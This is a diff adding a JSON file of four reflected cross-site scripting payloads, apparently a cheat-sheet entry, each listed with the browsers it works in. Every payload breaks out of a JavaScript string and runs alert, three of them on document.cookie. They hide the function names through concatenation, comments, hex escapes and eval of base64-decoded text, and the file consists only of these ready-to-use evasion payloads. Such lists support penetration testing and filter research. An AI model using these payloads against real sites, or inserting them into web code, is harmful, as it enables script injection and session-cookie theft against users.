@@ -1,0 +1,46 @@
+[
+    {
+        "description": "Reflected XSS into a JavaScript string: self object and string concatenation",
+        "code": "';self['ale'+'rt'](self['doc'+'ument']['coo'+'kie']);\/\/",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ],
+        "url": ""
+    },
+    {
+        "description": "Reflected XSS into a JavaScript string: self object and comment syntax",
+        "code": "';self[\/*foo*\/'alert'\/*bar*\/](self[\/*foo*\/'document'\/*bar*\/]['cookie']);\/\/",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ],
+        "url": ""
+    },
+    {
+        "description": "Reflected XSS into a JavaScript string: self object and hex escape sequence",
+        "code": "';self['\\x61\\x6c\\x65\\x72\\x74'](self['\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74']['\\x63\\x6f\\x6f\\x6b\\x69\\x65']);\/\/",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ],
+        "url": ""
+    },
+    {
+        "description": "Reflected XSS into a JavaScript string: self object, hex escape sequence and base64 encoded string",
+        "code": "';self['\\x65\\x76\\x61\\x6c'](self['\\x61\\x74\\x6f\\x62']('YWxlcnQoMSkK'));",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ],
+        "url": ""
+    }
+]
